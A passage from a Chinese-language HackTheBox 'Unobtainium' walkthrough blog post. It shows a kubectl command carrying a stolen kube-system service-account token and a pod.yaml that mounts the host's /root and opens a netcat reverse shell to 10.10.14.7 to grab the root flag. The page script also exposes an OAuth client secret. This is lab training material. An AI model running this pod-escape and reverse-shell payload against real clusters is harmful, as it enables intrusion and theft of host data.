<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl create -f ./pod.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg</span><br></pre></td></tr></table></figure>



<h2 id="pod-yaml"><a href="#pod-yaml" class="headerlink" title="pod.yaml"></a>pod.yaml</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: some-pod</span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">    - name: web</span><br><span class="line">      image: localhost:5000&#x2F;dev-alpine</span><br><span class="line">      command: [&quot;&#x2F;bin&#x2F;sh&quot;]</span><br><span class="line">      args: [&quot;-c&quot;, &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.7 4446 &gt;&#x2F;tmp&#x2F;f; sleep 100000&#39;]</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - mountPath: &#x2F;root&#x2F;</span><br><span class="line">        name: root-flag</span><br><span class="line">  volumes:</span><br><span class="line">  - hostPath:</span><br><span class="line">      path: &#x2F;root&#x2F;</span><br><span class="line">      type: &quot;&quot;</span><br><span class="line">    name: root-flag</span><br></pre></td></tr></table></figure>

<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>创建pod会执行我们的命令，得到root flag：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041410.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="mailto:lodash@4.17.4">lodash@4.17.4</a> vulnerabilities | lodash 4.17.4 | Snyk<br><a href="https://snyk.io/test/npm/lodash/4.17.4" target="_blank" rel="noopener">https://snyk.io/test/npm/lodash/4.17.4</a></li>
<li>Install and Set Up kubectl on Linux | Kubernetes<br><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux</a></li>
<li>DaemonSet | Kubernetes<br><a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/</a></li>
<li>Unobtainium User - Page 2 | RaidForums<br><a href="https://raidforums.com/Thread-Tutorial-Unobtainium-User?page=2" target="_blank" rel="noopener">https://raidforums.com/Thread-Tutorial-Unobtainium-User?page=2</a></li>
<li>Unobtainium root steps | RaidForums<br><a href="https://raidforums.com/Thread-Tutorial-Unobtainium-root-steps" target="_blank" rel="noopener">https://raidforums.com/Thread-Tutorial-Unobtainium-root-steps</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2021-09-06T01:03:30.060Z" itemprop="dateUpdated">2021-09-06 09:03:30</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&title=《Unobtainium - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&title=《Unobtainium - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Unobtainium - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/04/21/Atom-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Atom - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/04/10/Schooled-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Schooled - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&title=《Unobtainium - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&title=《Unobtainium - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Unobtainium - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKElEQVR42u3aSW7EMAwEQP//0841QGK7SWaBpdIpmMVSTQBCXI4jXueXlb/++ZXqt354YWBgvJZx3q5k4+QQV+9W973cBQMDYwPG1cbVcNnjJWH64cwYGBgYF4GyGjrziyMGBgbGPODeB9/JpRADAwNjksRWS2/3R/+3XBwDA+OFjLzq/vd//0p/AwMD41WMs7jm1GoCHJ0KAwNjaUYe4KqYPHGd74KBgYHRC8e90v/905pVQwwMjIUYvRJ/7/OTxuclBgMDY2lGtZF5/7jqu5PLKAYGxj6MKJDF4XKS4k5GQDAwMFZlzMcs8s9PwvdDyMbAwNiYMSmQ9QY1mikuBgbGNoy8JdAboZhcLh+ejIGBsTRjcuGrJsDzJPbhuxgYGIsy5he7e3bSEugNWxSuhhgYGAsx8mNNRsHun5k0FTAwMPZk5NskjEmDszqQcfR+LQwMjCUY1YtdHoKrZbjyRBsGBsZyjOrEQp6IVgtwSdCPamsYGBiLMqpDD9VYlwToXivim/YABgbGBoxqIJ60E6rhfpT7YmBgLMTolemrT+gd9CH1xcDAWJRxFlde7s8LatXr4+X/AQMDY1FGtUs4ucDlhbM8fW02OzEwMF7IyIPsfLSiegXMAzoGBsYOjEljsteG7I2ClRsDGBgYGzOSwtkk+OajaRgYGBh5eM2fUy2lRWkzBgbGBoxeMyC/FObFtWqgx8DA2IFRTR3zz/RKctVwj4GBsTTjA9PW8C6c8TkAAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
